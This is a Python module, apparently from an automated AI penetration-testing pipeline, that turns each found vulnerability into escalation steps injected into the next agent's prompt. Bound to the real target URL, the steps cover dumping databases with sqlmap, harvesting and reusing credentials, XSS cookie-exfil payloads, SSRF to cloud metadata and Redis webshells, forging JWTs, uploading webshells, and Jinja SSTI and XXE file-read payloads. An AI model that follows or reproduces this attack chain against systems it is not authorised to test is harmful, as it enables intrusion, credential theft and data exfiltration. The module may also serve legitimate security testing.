"""Explicit follow-up flows - a found vuln -> the concrete next actions the next agent MUST take.

The pipeline already LAUNCHES the right consumer when a finding or credential appears (the orchestrator
re-sweep). What was missing is telling that consumer WHAT to do with it: today a handoff is a prose
summary and the next agent gets only its generic objective, so the chain depends on the model
re-deciding it from scratch. This registry turns each LIVE finding into explicit, parameterised next
steps bound to the ACTUAL url that was found (sqli -> dump -> creds -> login), so the acting agent
follows a concrete chain instead of guessing. `expand(ctx)` stages them into `ctx.follow_ups`; base.py
injects the ones addressed to the acting agent into its prompt.

The steps mirror the chaining/escalation doctrine in knowledge.py, but knowledge is generic ("when you
see SQLi, dump it") while these are bound to the real URL and pushed at the agent as required next
steps - the deterministic transition, with the model still choosing the exact payload/content.
"""

from __future__ import annotations

# canonical class <- the synonyms agents actually emit in finding.cls
_ALIASES = {
    "idor": "bola", "broken-object-level": "bola",
    "mass-assignment": "bfla", "privilege-escalation": "bfla", "privesc": "bfla", "broken-function-level": "bfla",
    "rce-lead": "rce", "command-injection": "rce", "cmdi": "rce", "code-injection": "rce",
    "path-traversal": "lfi", "traversal": "lfi", "file-read": "lfi", "fileread": "lfi", "rfi": "lfi",
    "ssrf-lead": "ssrf",
    "credential": "creds", "secret": "creds", "creds-leak": "creds", "password": "creds",
    "nosqli": "nosql", "nosql-injection": "nosql",
    "file-upload": "upload", "unrestricted-upload": "upload",
    "jwt-forgery": "jwt", "token": "jwt", "auth-bypass": "jwt",
    "error-disclosure": "error", "stack-trace": "error", "stacktrace": "error", "info-leak": "error",
    "xml-external-entity": "xxe",
}


def _canon(cls: str) -> str:
    c = (cls or "").strip().lower()
    return _ALIASES.get(c, c)


def _sqli(f):
    return ("lateral", "validator"), [
        f"sqlmap {f.url} --dump   -> pull the users/admin table (password hashes, API keys, TOTP secrets, tokens)",
        "harvest every credential / hash / token from the dumped rows into artifacts.tokens",
        'try the recovered credentials at the login endpoint (http-request <login> -D "username=..&password=.."),'
        " capture the Set-Cookie, then reuse that session on every path that needs auth",
    ]


def _bola(f):
    return ("access", "lateral"), [
        f'enumerate the id range - fuzz "{f.url}" with {{NUMBERS}} in the id - and QUANTIFY how many records return',
        "quote an ownership field (email / account-id / owner) from several rows to prove they are not yours",
    ]


def _lfi(f):
    return ("lateral",), [
        f"read the app's OWN source/config through {f.url} (index.php, config.php, .env, settings.py; "
        "`php://filter/convert.base64-encode/resource=` for source) to recover queries, creds and hidden routes",
        "then if you can poison an included file (access.log via User-Agent/Referer, /proc/self/environ, an upload) "
        "escalate to RCE; report the exact next step",
    ]


def _ssti(f):
    return ("lateral",), [
        f"escalate the template injection at {f.url} from {{7*7}} to the engine object chain "
        "(Jinja `__class__.__mro__[1].__subclasses__()...__import__('os')`) to read source/flag or run a command; "
        "quote the output",
    ]


def _xss(f):
    return ("access", "lateral"), [
        f"check whether an admin/moderator/bot views the sink at {f.url}; if so land a cookie-exfil payload and "
        "reuse the stolen session - otherwise show exactly where it executes in an HTML context",
    ]


def _rce(f):
    return ("lateral",), [
        f"from the RCE primitive at {f.url} prove non-destructive impact (run `id`, read a flag/config), then report "
        "the onward path (local creds / SUID / internal hosts) as the exact manual next step - never fabricate output",
    ]


def _ssrf(f):
    return ("lateral", "access"), [
        f"aim the fetch at internal targets via {f.url}: 127.0.0.1, 169.254.169.254 (cloud metadata = creds), "
        "internal hostnames; enumerate services then pivot (`dict://`/`gopher://` to Redis -> webshell). "
        "WAF on localhost? use octal/decimal/[::] IP encodings",
    ]


def _bfla(f):
    return ("access", "lateral"), [
        f"reach the privileged action at {f.url} as a LOW-priv (or no) identity - call it with the weakest "
        "identity and confirm it executes",
        "try mass-assignment: add a privileged field (\"role\":\"admin\" / \"isAdmin\":true / \"verified\":true) "
        "to the create/update body the UI omits",
    ]


def _nosql(f):
    return ("lateral", "access", "api"), [
        f"exploit the NoSQL operator at {f.url}: auth-bypass with `param[$ne]=` / `param[$gt]=`, then "
        "boolean-extract a secret char by char with `param[$regex]=^a` (object/array params, not a flat value)",
    ]


def _jwt(f):
    return ("lateral", "access"), [
        f"decode the JWT/token (from {f.url}) and read its role/user claims, then forge: try alg=none (strip the "
        "sig), RS256->HS256 key-confusion (sign with the server's public key as the HMAC secret), or a weak HMAC "
        "secret cracked offline - set role/user to admin and replay with http-request -H \"Cookie/Authorization: ...\"",
    ]


def _upload(f):
    return ("lateral",), [
        f"turn the upload at {f.url} into code-exec: drop a webshell (.php/.jsp/.phtml), or Zip-Slip (archive "
        "entry `../../../x` writes outside the extract dir), or extension/Content-Type/magic-byte confusion to "
        "defeat the filter; then request the dropped file to run it",
    ]


def _graphql(f):
    return ("graphql", "lateral", "api"), [
        f"run introspection on {f.url} (`{{__schema{{types{{name fields{{name}}}}}}}}`) to reveal HIDDEN "
        "queries/mutations the UI never calls (deleteUser, publish, makeAdmin) and invoke the privileged ones",
        "alias-BATCH a guarded resolver (`a:op(..) b:op(..)`) to bypass per-request rate-limit/auth, and read "
        "mutation input types for mass-assignable fields",
    ]


def _xxe(f):
    return ("lateral",), [
        f"escalate the XXE at {f.url}: define an external entity to read local files "
        "(`<!ENTITY x SYSTEM \"file:///etc/passwd\">`) or to reach internal URLs (SSRF); quote the returned content",
    ]


def _error(f):
    return ("lateral", "exposure"), [
        f"mine the verbose error at {f.url}: the file path / SQL query / framework / version it names is your next "
        "probe - if it leaks source, read it; if it leaks a query, craft the precise injection; if a stack trace, "
        "target the named file",
    ]


# canonical class -> generator returning (agents_tuple, steps_list)
_FLOWS = {
    "sqli": _sqli, "bola": _bola, "bfla": _bfla, "lfi": _lfi,
    "ssti": _ssti, "xss": _xss, "rce": _rce, "ssrf": _ssrf,
    "nosql": _nosql, "jwt": _jwt, "upload": _upload, "graphql": _graphql,
    "xxe": _xxe, "error": _error,
}


def _exposure(f):
    """Exposure splits by WHAT was exposed: VCS/source/backup vs an admin/management UI."""
    blob = f"{f.title} {f.url}".lower()
    if any(k in blob for k in (".git", ".svn", "backup", "source", ".env", "config", ".bak")):
        return ("exposure", "lateral"), [
            f"git-extract (or fetch) the full tree at {f.url}, then scan-secrets the files",
            "read the source for the exact SQL queries, secret keys and hidden endpoints; act on them immediately",
        ]
    if any(k in blob for k in ("admin", "panel", "dashboard", "login", "management", "console")):
        return ("lateral", "exposure"), [
            f"dirsearch INTO {f.url} for the real console (the index/login usually sits one level deeper)",
            "perform an actual privileged READ (list users / read settings) to prove the access is real",
        ]
    return None


def _for_finding(f):
    cls = _canon(f.cls)
    if cls == "exposure":
        return _exposure(f)
    gen = _FLOWS.get(cls)
    return gen(f) if gen else None


def expand(ctx) -> None:
    """Scan live findings + harvested secrets and stage explicit follow-ups (deduped by class+url)."""
    for f in ctx.findings:
        if f.status == "dropped":
            continue
        res = _for_finding(f)
        if res:
            agents, steps = res
            ctx.add_follow_up(_canon(f.cls), f.url, steps, agents, f.title)
    # harvested credentials/tokens (sqli dump, config, JS) -> the "got creds -> log in / reuse" chain
    if ctx.secrets:
        skinds = {s.get("kind", "secret") for s in ctx.secrets}
        kinds = ", ".join(sorted(skinds))
        ctx.add_follow_up("creds", f"harvested:{kinds}", [
            f"a {kinds} was harvested - reuse it on EVERY authed path (re-fire everything that returned 401/403) "
            "and on sibling hosts",
            "if it is a username/password, submit it at the login endpoint (http-request <login> -D \"user=..&"
            "password=..\") and take the resulting session as a new identity",
        ], ("lateral", "access"), "harvested credentials/secrets")
        if {"jwt", "bearer"} & skinds:
            ctx.add_follow_up("jwt", "harvested:token", [
                "decode the harvested JWT/bearer and read its role/user claims; try alg=none, RS256->HS256 "
                "key-confusion, or a weak HMAC secret to forge an admin token, then replay it",
                "but first reuse the token AS-IS on every authed path - it often already authenticates",
            ], ("lateral", "access"), "harvested token")
